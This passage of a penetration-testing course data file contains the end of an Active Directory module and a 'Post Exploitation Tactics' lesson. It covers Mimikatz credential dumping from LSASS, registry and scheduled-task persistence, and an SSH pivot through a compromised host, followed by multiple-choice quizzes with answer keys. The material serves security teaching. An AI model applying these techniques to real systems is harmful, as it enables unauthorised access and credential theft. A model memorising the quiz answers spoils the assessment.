              explanation: 'BloodHound maps AD pathways, highlighting privilege loops, nested groups, and misconfigured permissions that lead to domain compromise.'
            },
            {
              id: 'q-ad-3',
              question: 'What is "Pass-the-Hash" (PtH) lateral movement?',
              options: [
                'Using a GPU to crack hashes quickly.',
                'Authenticating to remote services using a victim\'s password NTLM hash directly, without needing to crack it to recover the plain text password.',
                'Sniffing hashes over the network.',
                'Injecting hashes into a database.'
              ],
              correctOption: 1,
              explanation: 'Windows NTLM authentication accepts password hashes directly. Pass-the-Hash allows attackers to access remote systems using captured hashes directly, bypassing the need to crack them.'
            },
            {
              id: 'q-ad-4',
              question: 'Which Active Directory vulnerability targets accounts that have "Do not require Kerberos preauthentication" enabled, allowing testers to request AS-REP packets and crack hashes offline?',
              options: [
                'Kerberoasting',
                'AS-REP Roasting',
                'Silver Ticket',
                'Kerberos Delegation'
              ],
              correctOption: 1,
              explanation: 'AS-REP Roasting targets accounts lacking preauthentication. Testers request authentication tickets (AS-REP) for these accounts, extracting and cracking the ticket hashes offline.'
            }
          ]
        },
        {
          id: 'post-exploit',
          title: 'Post Exploitation Tactics',
          description: 'Establish persistence, dump credentials using Mimikatz, and pivot through networks.',
          duration: '20 mins',
          content: `### Post Exploitation Tactics

**Difficulty:** Hard  
**Estimated Study Time:** 20 Minutes  
**Prerequisites:** Active Directory Exploitation  

#### Learning Objectives
- Deploy persistent backdoors across systems.
- Extract passwords and NTLM hashes from memory using Mimikatz.
- Set up network pivoting tunnels to access isolated subnets.

#### Key Concepts
- **Persistence:** Ensuring continued access to a compromised system across reboots and password changes.
- **Credential Dumping:** Extracting credentials (passwords, hashes, tickets) from system memory or databases.
- **Mimikatz:** A post-exploitation tool that can extract cleartext passwords, NTLM hashes, and Kerberos tickets from Windows memory (LSASS).
- **Pivoting / Port Forwarding:** Using a compromised system as an intermediary hop to route traffic and scan isolated internal subnets.

#### Hands-On Lab: Pivoting Setup
Configure port forwarding tunnels using SSH:
\`\`\`bash
# Forward local port 8080 to an isolated internal web server via a compromised host
ssh -L 8080:10.10.10.50:80 user@compromised_host.com
\`\`\`

#### Detailed Lesson Content
Once initial exploitation is successful, the post-exploitation phase begins.
- **Persistence** is established by configuring autorun registry keys, scheduled tasks, or adding SSH keys to ensure access survives system reboots.
- **Credential Dumping** extracts credentials to escalate privileges or move laterally. Testers use tools like **Mimikatz** to dump credentials from memory (the LSASS process) on Windows systems.
- **Pivoting** allows you to access isolated subnets. By setting up tunnels (using SSH, Chisel, or Metasploit proxy routes) through a compromised dual-homed host, you can route traffic to scan and exploit internal systems that are not directly exposed to the internet.`,
          quiz: [
            {
              id: 'q-pext-1',
              question: 'Which post-exploitation tool specializes in extracting cleartext passwords, hashes, and Kerberos tickets from Windows LSASS memory?',
              options: [
                'Mimikatz',
                'BloodHound',
                'John the Ripper',
                'Wireshark'
              ],
              correctOption: 0,
              explanation: 'Mimikatz accesses Windows memory structures (LSASS) to dump plain text passwords, password hashes, and Kerberos tickets.'
            },
            {
              id: 'q-pext-2',
              question: 'What is the purpose of "Pivoting" in penetration testing?',
              options: [
                'To decrypt database backups.',
                'To use a compromised system to route traffic, scan, and attack other isolated systems in an internal network that are not directly accessible from the outside.',
                'To change the password of the active user.',
                'To escape a virtual machine sandbox.'
              ],
              correctOption: 1,
              explanation: 'Pivoting establishes routing pathways through a compromised host, allowing testers to access and test isolated internal network segments.'
            },
            {
              id: 'q-pext-3',
              question: 'Which of the following is a common method for establishing persistence on a Windows host?',
              options: [
                'Running a quick Nmap scan.',
                'Creating a scheduled task or editing a Registry "Run" key to execute a backdoor payload on system boot.',
                'Using a strong password policy.',
                'Restarting the DNS service.'
              ],
              correctOption: 1,
              explanation: 'Scheduled tasks and Registry Run keys are standard Windows persistence vectors: they trigger automatically during system boot or user login.'
            },
            {
              id: 'q-pext-4',
              question: 'Which Windows process is targeted by credential dumping tools like Mimikatz to extract active user session tokens and hashes?',
              options: [
                'explorer.exe',
                'lsass.exe',
                'svchost.exe',
                'services.exe'
              ],
              correctOption: 1,
              explanation: 'The Local Security Authority Subsystem Service (lsass.exe) manages system security and authentication tokens, making it a primary target for credential dumping.'
            }
          ]
        }
      ]
    }
  ]
};
